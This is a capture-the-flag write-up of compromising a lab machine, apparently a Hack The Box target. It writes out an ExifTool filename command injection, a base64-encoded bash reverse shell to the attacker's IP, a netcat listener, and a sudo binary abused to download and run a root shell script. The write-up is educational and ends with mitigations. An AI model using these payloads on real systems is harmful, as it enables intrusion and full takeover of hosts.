In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.

## Enumeration

I began the box by running Rustscan to look for open ports.

```php
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

```

Two ports were open:
* 22 - SSH
* 80 - HTTP

Port 80 was redirecting to 'http://eforenzics.htb/' so I added that to my hosts files. I used Feroxbuster to look for hidden files, and wfuzz to look for subdomains. They did not find anything interesting.

## File Upload

I opened the website in a browser.

![eForenzics Site](/assets/images/Investigation/eForenzicsSite.png "eForenzics Site")

The website was mostly static. Except for the 'Free Services' page that allowed uploading files.

![File Upload](/assets/images/Investigation/FileUpload.png "File Upload")

I tried uploading an image to the site. The image was uploaded, and I was given a link to view an analysis report on the file.

![File Uploaded](/assets/images/Investigation/FileUploaded.png "File Uploaded")

I clicked on the link. It took me to a page that displayed the file image's metadata extracted with [ExifTool](https://exiftool.org/).

![ExifTool Results](/assets/images/Investigation/ExifTool.png "ExifTool Results")

Seeing file uploads, I thought I might be able to get [Local File Inclusion](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/), but I was not able to access the uploaded files, just the text file with the ExifTool results.

I tried adding PHP code to the image description, but it was not executed. I also tried to append commands after the file hoping they would be sent to the command line and executed. That also failed.

I looked for known vulnerabilities in ExifTool version 12.37 and [found one](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429). I was trying to add commands at the end of the file name, but I had to add in at the beginning and end it with a pipe (\|).

I tried it by beginning with something simple. I could not run something like `id` because the output was not displayed. So I tried starting a web server and sending a file called `wget 10.10.14.11 |` with Burp Repeater. 

It worked. 

```python
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.197 - - [19/Feb/2023 09:13:26] "GET / HTTP/1.1" 200 -
```

Next, I went for a reverse shell. To minimize the risk of having issues with special characters, I started by base64 encoding my payload.

```php
$ echo 'bash  -i >& /dev/tcp/10.10.14.8/4444  0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAK
```

Then I sent it in the filename.

```php
Content-Disposition: form-data; name="image"; filename="echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAK | base64 -d | bash |"
Content-Type: application/x-php
```

I got my reverse shell.

```php
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.197] 46926
bash: cannot set terminal process group (959): Inappropriate ioctl for device
bash: no job control in this shell
www-data@investigation:~/uploads/1676816336$
```

## User

Once connected to the server, I saw that a cronjobs was interacting with files in '/usr/local/investigation'.

```php
www-data@investigation:~/html$ crontab -l
...
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
```

I looked in the folder  and saw that it contained an email about Windows Event Logs.

```php
www-data@investigation:~/html$ ls /usr/local/investigation/
'Windows Event Logs for Analysis.msg'   analysed_log

www-data@investigation:/usr/local/investigation$ file Windows\ Event\ Logs\ for\ Analysis.msg 
Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message
```

I downloaded the file to my machine to better investigate it. I installed [MSGConvert](https://www.matijs.net/software/msgconv/) to convert the email in a format that I could read. The message had an attachment. I save the base64 of the attachment in a file and decoded it, then unzipped the file in contained.

```java
$ msgconvert logs.msg

$ vim logs.msg

$ cat b64.txt | base64 -d > evtx-logs.zip

$ file evtx-logs.zip
evtx-logs.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

$ mkdir logs

$ cd logs

$ unzip ../evtx-logs.zip
Archive:  ../evtx-logs.zip
  inflating: security.evtx

$ file security.evtx
security.evtx: MS Windows 10-11 Event Log, version  3.2, 238 chunks (no. 237 in use), next record no. 20013
```


The attached file contained the Windows Security Event Logs. This file is not human-readable, so I used [evtxexport](https://manpages.ubuntu.com/manpages/bionic/en/man1/evtxexport.1.html) to extract the data in a text file.

```php
$ evtxexport security.evtx > exported.txt
```

The extracted file contained 440k lines. I took a quick look at it, but there was too much to find anything. I made a quick search and found out that code 4625 was used for failed log-on events. I searched the file for this code and found one event with a password in it.


```python
Event identifier        : 0x00001211 (4625)
Number of strings       : 21
String: 1               : S-1-5-18
String: 2               : EFORENZICS-DI$
String: 3               : WORKGROUP
String: 4               : 0x00000000000003e7
String: 5               : S-1-0-0
String: 6               : REDACTED
String: 7               :
```

I used the password to connect as 'smorton' and it worked.

```python
$ ssh smorton@target

smorton@investigation:~$ ls

smorton@investigation:~$ cat user.txt

```

## Root

To get to root, I looked at what the user could run with sudo.

```php
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary

smorton@investigation:~$ file /usr/bin/binary
/usr/bin/binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a703575c5c944bfcfea8a04f0aabaf0b4fa9f7cb, for GNU/Linux 3.2.0, not stripped

smorton@investigation:~$ sudo /usr/bin/binary
Exiting...
```

They could execute a binary. I tried running it, but it appeared to exit immediately. I downloaded the executable to my machine and opened it in Ghidra. I renamed a few variables and added comments to make the code readable.

![Binary decompiled](/assets/images/Investigation/BinaryDecompiled.png "Binary Decompiled")

The binary needed two arguments, a URL and a file name. The file name needed to be "lDnxUysaQn". It used curl to download from the given URL and save the content to the file specified. It then used perl to execute the file it downloaded.

It created a small perl script on my machine to run bash and launched a web server to give access to the script.

```
$ cat index.html
system('/bin/bash -p')

$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I ran the program giving it a URL that pointed to my machine and the expected file name.

My web server got hit.

```php
10.10.11.197 - - [19/Feb/2023 10:41:08] "GET / HTTP/1.1" 200 -
```

And I was root on the server.

```php
smorton@investigation:~$ sudo /usr/bin/binary 10.10.14.8 "lDnxUysaQn"

root@investigation:/home/smorton# whoami

```

## Mitigation

`Making that box safer would start by keeping tools up to date. The version of exiftool on the server is outdated and has a known vulnerability. A simple update would have prevented the RCE. `

`Next, there were sensitive files readable by anyone on the server. The email contained security logs. It should not be left on a server for anyone to grab it.`

`The last issue was with the binary that ran any code it downloaded as root. Something like this should probably not exists on a real server. Executing arbitrary code is dangerous, doing it as root is worst.`
